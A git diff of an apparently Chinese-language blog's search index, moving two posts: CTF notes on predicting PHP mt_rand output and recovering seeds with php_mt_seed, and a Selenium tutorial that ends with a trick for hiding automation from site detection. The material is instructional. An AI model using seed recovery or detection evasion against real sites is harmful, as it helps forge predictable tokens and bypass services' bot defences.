+<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
+<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
+<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
+<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
+<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
+那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
+<p>kali下，进入目录，make</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
+<p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>php伪随机数漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -1346,44 +1387,73 @@ file -f:报错出具体内容</p>
       </categories>
   </entry>
   <entry>
-    <title>php伪随机数漏洞</title>
-    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
-<a id="more"></a>
-<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
-<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
-<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
-<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
-<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
-<p>这张图能帮助我们更好的了解php伪随机数</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
-<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
-<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
-<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
-<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
-那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
-<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
-<p>kali下，进入目录，make</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
-<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
-<p>可以得到种子</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
-<p>验证种子是否一样就是看 输出的序列是否一样</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
-<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
-<p>平台：ctfshow    web入门  web25</p>
-<p>下面放出 此题的wp ：</p>
-<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
-<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+    <title>python之selenium模块使用</title>
+    <url>/2021/02/24/python%E4%B9%8Bselenium%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介">¶</a><strong>简介</strong></h2>
+<p>selenium最初是一个自动化测试工具,而爬虫中使用它主要是为了解决requests无法直接执行JavaScript代码的问题 selenium本质是通过驱动浏览器，完全模拟浏览器的操作，比如跳转、输入、点击、下拉等，来拿到网页渲染之后的结果，可支持多种浏览器我这里是使用chrome</p>
+<h2 id="环境安装"><a class="header-anchor" href="#环境安装">¶</a><strong>环境安装</strong></h2>
+<ul>
+<li>
+<p>下载安装selenium：pip install selenium</p>
+</li>
+<li>
+<p>下载chrome浏览器驱动程序：</p>
+<p><a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p>
+</li>
+<li>
+<p>环境变量配置</p>
+<p><a href="https://www.cnblogs.com/lfri/p/10542797.html">https://www.cnblogs.com/lfri/p/10542797.html</a></p>
+</li>
+</ul>
+<h2 id="简单使用-效果展示"><a class="header-anchor" href="#简单使用-效果展示">¶</a><strong>简单使用/效果展示</strong></h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">driver = webdriver.Chrome() </span><br><span class="line"><span class="comment"># 用get打开百度页面</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment"># 查找页面的“设置”选项，并进行点击</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;设置&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># # 打开设置后找到“搜索设置”选项，设置为每页显示50条</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;搜索设置&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 选中每页显示50条</span></span><br><span class="line">m = driver.find_element_by_id(<span class="string">&#x27;nr&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">m.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;nr&quot;]/option[3]&#x27;</span>).click()</span><br><span class="line">m.find_element_by_xpath(<span class="string">&#x27;.//option[3]&#x27;</span>).click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 点击保存设置</span></span><br><span class="line">driver.find_elements_by_class_name(<span class="string">&quot;prefpanelgo&quot;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 处理弹出的警告页面   确定accept() 和 取消dismiss()</span></span><br><span class="line">driver.switch_to_alert().accept()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 找到百度的输入框，并输入 美女</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&#x27;kw&#x27;</span>).send_keys(<span class="string">&#x27;美女&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 点击搜索按钮</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&#x27;su&#x27;</span>).click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 在打开的页面中找到“Selenium - 开源中国社区”，并打开这个页面</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;美女_百度图片&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>
+<h2 id="浏览器创建"><a class="header-anchor" href="#浏览器创建">¶</a><strong>浏览器创建</strong></h2>
+<p>Selenium支持非常多的浏览器，如Chrome、Firefox、Edge等，还有Android、BlackBerry等手机端的浏览器。另外，也支持无界面浏览器PhantomJS。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser = webdriver.Safari()</span><br></pre></td></tr></table></figure>
+<h2 id="元素定位"><a class="header-anchor" href="#元素定位">¶</a><strong>元素定位</strong></h2>
+<p>webdriver 提供了一系列的元素定位方法，常用的有以下几种：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_element_by_id()</span><br><span class="line">find_element_by_name()</span><br><span class="line">find_element_by_class_name()</span><br><span class="line">find_element_by_tag_name()</span><br><span class="line">find_element_by_link_text()</span><br><span class="line">find_element_by_partial_link_text()</span><br><span class="line">find_element_by_xpath()</span><br><span class="line">find_element_by_css_selector()</span><br></pre></td></tr></table></figure>
+<p>注意</p>
+<p>1、find_element_by_xxx找的是第一个符合条件的标签，find_elements_by_xxx找的是所有符合条件的标签。</p>
+<p>2、根据ID、CSS选择器和XPath获取，它们返回的结果完全一致。</p>
+<p>3、另外，Selenium还提供了通用方法<code>find_element()</code>，它需要传入两个参数：查找方式<code>By</code>和值。实际上，它就是<code>find_element_by_id()</code>这种方法的通用函数版本，比如<code>find_element_by_id(id)</code>就等价于<code>find_element(By.ID, id)</code>，二者得到的结果完全一致。</p>
+<h2 id="键盘操作"><a class="header-anchor" href="#键盘操作">¶</a>键盘操作</h2>
+<p>想要调用键盘按键操作，需要引入keys包:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br></pre></td></tr></table></figure>
+<p>示例: 在谷歌首页输入’美女’  并且按下回车键完成搜索</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  sleep</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    b = webdriver.Chrome()</span><br><span class="line">    b.get(<span class="string">&#x27;https://www.google.com/webhp?ie=UTF-8&#x27;</span>)</span><br><span class="line">    b.find_element_by_xpath(<span class="string">&#x27;//input[@class=&quot;gLFyf gsfi&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;美女&#x27;</span>)</span><br><span class="line">    b.find_element_by_xpath(<span class="string">&#x27;//input[@class=&quot;gLFyf gsfi&quot;]&#x27;</span>).send_keys(Keys.ENTER)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    b.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>更多其他操作参考: <a href="https://www.itread01.com/content/1496631486.html">https://www.itread01.com/content/1496631486.html</a></p>
+<h2 id="节点交互"><a class="header-anchor" href="#节点交互">¶</a><strong>节点交互</strong></h2>
+<p>Selenium可以驱动浏览器来执行一些操作，也就是说可以让浏览器模拟执行一些动作。比较常见的用法有：输入文字时用<code>send_keys()</code>方法，清空文字时用<code>clear()</code>方法，点击按钮时用<code>click()</code>方法。示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import time</span><br><span class="line">browser &#x3D; webdriver.Chrome()</span><br><span class="line">browser.get(&#39;https:&#x2F;&#x2F;www.taobao.com&#39;)</span><br><span class="line">input &#x3D; browser.find_element_by_id(&#39;q&#39;)</span><br><span class="line">input.send_keys(&#39;MAC&#39;)</span><br><span class="line">time.sleep(1)</span><br><span class="line">input.clear()</span><br><span class="line">input.send_keys(&#39;IPhone&#39;)</span><br><span class="line">button &#x3D; browser.find_element_by_class_name(&#39;btn-search&#39;)</span><br><span class="line">button.click()</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
+<h2 id="动作链"><a class="header-anchor" href="#动作链">¶</a><strong>动作链</strong></h2>
+<p>在上面的实例中，一些交互动作都是针对某个节点执行的。比如，对于输入框，我们就调用它的输入文字和清空文字方法；对于按钮，就调用它的点击方法。其实，还有另外一些操作，它们没有特定的执行对象，比如鼠标拖曳、键盘按键等，这些动作用另一种方式来执行，那就是动作链。</p>
+<p>比如，现在实现一个节点的拖曳操作，将某个节点从一处拖曳到另外一处，可以这样实现：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)<span class="comment">#框架切换  browser.switch_to.frame(框架id)</span></span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">&#x27;#draggable&#x27;</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">&#x27;#droppable&#x27;</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line"><span class="comment"># actions.drag_and_drop(source, target)</span></span><br><span class="line">actions.click_and_hold(source)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    actions.move_by_offset(xoffset=<span class="number">17</span>,yoffset=<span class="number">0</span>).perform()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">actions.release()</span><br></pre></td></tr></table></figure>
+<h2 id="执行JavaScript"><a class="header-anchor" href="#执行JavaScript">¶</a><strong>执行JavaScript</strong></h2>
+<p>对于某些操作，Selenium API并没有提供。比如，下拉进度条，它可以直接模拟运行JavaScript，此时使用<code>execute_script()</code>方法即可实现，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.jd.com/&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.scrollTo(0, document.body.scrollHeight)&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="获取页面源码数据"><a class="header-anchor" href="#获取页面源码数据">¶</a><strong>获取页面源码数据</strong></h2>
+<p>通过<code>page_source</code>属性可以获取网页的源代码，接着就可以使用解析库（如正则表达式、Beautiful Soup、pyquery等）来提取信息了。</p>
+<h2 id="前进和后退"><a class="header-anchor" href="#前进和后退">¶</a><strong>前进和后退</strong></h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#模拟浏览器的前进后退</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>)</span><br><span class="line">browser.get(<span class="string">&#x27;http://www.sina.com.cn/&#x27;</span>)</span><br><span class="line">browser.back()</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure>
+<h2 id="Cookie处理"><a class="header-anchor" href="#Cookie处理">¶</a><strong>Cookie处理</strong></h2>
+<p>使用Selenium，还可以方便地对Cookies进行操作，例如获取、添加、删除Cookies等。示例如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;www.zhihu.com&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>&#125;)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line">print(browser.get_cookies())</span><br></pre></td></tr></table></figure>
+<h2 id="异常处理"><a class="header-anchor" href="#异常处理">¶</a><strong>异常处理</strong></h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException,NoSuchElementException,NoSuchFrameException</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser=webdriver.Chrome()</span><br><span class="line">    browser.get(<span class="string">&#x27;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span>)</span><br><span class="line">    browser.switch_to.frame(<span class="string">&#x27;iframssseResult&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> TimeoutException <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">except</span> NoSuchFrameException <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>
+<h2 id="谷歌无头浏览器"><a class="header-anchor" href="#谷歌无头浏览器">¶</a><strong>谷歌无头浏览器</strong></h2>
+<p>一款无界面的谷歌浏览器。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 创建一个参数对象，用来控制chrome以无界面模式打开</span></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line"><span class="comment"># 驱动路径</span></span><br><span class="line">path = <span class="string">r&#x27;C:\Users\ZBLi\Desktop\1801\day05\ziliao\chromedriver.exe&#x27;</span></span><br><span class="line"><span class="comment"># 创建浏览器对象</span></span><br><span class="line">browser = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)</span><br><span class="line"><span class="comment"># 上网</span></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.save_screenshot(<span class="string">&#x27;baidu.png&#x27;</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
+<h2 id="selenium规避被检测识别"><a class="header-anchor" href="#selenium规避被检测识别">¶</a><strong>selenium规避被检测识别</strong></h2>
+<p>现在不少大网站有对selenium采取了监测机制。比如正常情况下我们用浏览器访问淘宝等网站的 window.navigator.webdriver的值为</p>
+<p>undefined。而使用selenium访问则该值为true。那么如何解决这个问题呢？</p>
+<p>只需要设置Chromedriver的启动参数即可解决问题。在启动Chromedriver之前，为Chrome开启实验性功能参数<code>excludeSwitches</code>，它的值为<code>[‘enable-automation’]</code>，完整代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">driver = Chrome(options=option)</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>web技术学习</category>
-        <category>php伪随机数漏洞</category>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1521,73 +1591,6 @@ regex也有以上六种用法</p>
 </ul>
 <p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
 ]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之selenium模块使用</title>
-    <url>/2021/02/24/python%E4%B9%8Bselenium%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介">¶</a><strong>简介</strong></h2>
-<p>selenium最初是一个自动化测试工具,而爬虫中使用它主要是为了解决requests无法直接执行JavaScript代码的问题 selenium本质是通过驱动浏览器，完全模拟浏览器的操作，比如跳转、输入、点击、下拉等，来拿到网页渲染之后的结果，可支持多种浏览器我这里是使用chrome</p>
-<h2 id="环境安装"><a class="header-anchor" href="#环境安装">¶</a><strong>环境安装</strong></h2>
-<ul>
-<li>
-<p>下载安装selenium：pip install selenium</p>
-</li>
-<li>
-<p>下载chrome浏览器驱动程序：</p>
-<p><a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p>
-</li>
-<li>
-<p>环境变量配置</p>
-<p><a href="https://www.cnblogs.com/lfri/p/10542797.html">https://www.cnblogs.com/lfri/p/10542797.html</a></p>
-</li>
-</ul>
-<h2 id="简单使用-效果展示"><a class="header-anchor" href="#简单使用-效果展示">¶</a><strong>简单使用/效果展示</strong></h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">driver = webdriver.Chrome() </span><br><span class="line"><span class="comment"># 用get打开百度页面</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment"># 查找页面的“设置”选项，并进行点击</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;设置&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># # 打开设置后找到“搜索设置”选项，设置为每页显示50条</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;搜索设置&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 选中每页显示50条</span></span><br><span class="line">m = driver.find_element_by_id(<span class="string">&#x27;nr&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">m.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;nr&quot;]/option[3]&#x27;</span>).click()</span><br><span class="line">m.find_element_by_xpath(<span class="string">&#x27;.//option[3]&#x27;</span>).click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 点击保存设置</span></span><br><span class="line">driver.find_elements_by_class_name(<span class="string">&quot;prefpanelgo&quot;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 处理弹出的警告页面   确定accept() 和 取消dismiss()</span></span><br><span class="line">driver.switch_to_alert().accept()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 找到百度的输入框，并输入 美女</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&#x27;kw&#x27;</span>).send_keys(<span class="string">&#x27;美女&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 点击搜索按钮</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&#x27;su&#x27;</span>).click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 在打开的页面中找到“Selenium - 开源中国社区”，并打开这个页面</span></span><br><span class="line">driver.find_elements_by_link_text(<span class="string">&#x27;美女_百度图片&#x27;</span>)[<span class="number">0</span>].click()</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>
-<h2 id="浏览器创建"><a class="header-anchor" href="#浏览器创建">¶</a><strong>浏览器创建</strong></h2>
-<p>Selenium支持非常多的浏览器，如Chrome、Firefox、Edge等，还有Android、BlackBerry等手机端的浏览器。另外，也支持无界面浏览器PhantomJS。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser = webdriver.Safari()</span><br></pre></td></tr></table></figure>
-<h2 id="元素定位"><a class="header-anchor" href="#元素定位">¶</a><strong>元素定位</strong></h2>
-<p>webdriver 提供了一系列的元素定位方法，常用的有以下几种：</p>
